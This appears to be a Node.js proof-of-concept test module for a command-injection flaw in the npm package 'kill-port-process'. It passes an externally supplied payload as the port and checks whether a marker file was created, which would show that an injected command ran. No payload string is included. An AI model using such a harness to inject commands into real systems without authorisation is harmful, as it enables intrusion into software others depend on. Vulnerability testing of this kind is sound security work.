const fs = require('fs');
const killPortProcess = require("kill-port-process");

function exploitFunction(payload) {
    const PORT = payload;
    try {
        if (fs.existsSync("./kill-port-process")) {
            fs.unlinkSync("./kill-port-process");
            console.log("File removed:", "./kill-port-process");
        }
    } catch (err) {
        console.error(err);
    }
    let file_exist = fs.existsSync("./kill-port-process");
    expect(file_exist).toBe(false);
    return killPortProcess(PORT)
        .then(() => {
            console.log("here!");
            file_exist = fs.existsSync("./kill-port-process");
            expect(file_exist).toBe(true);
        })
        .catch((err) => {})
        .finally(() => {
            console.log("here!!!!");
            if (fs.existsSync("./kill-port-process")) {
                fs.unlinkSync("./kill-port-process");
                console.log("File removed!:", "./kill-port-process");
            }
        });
}

module.exports = { exploitFunction };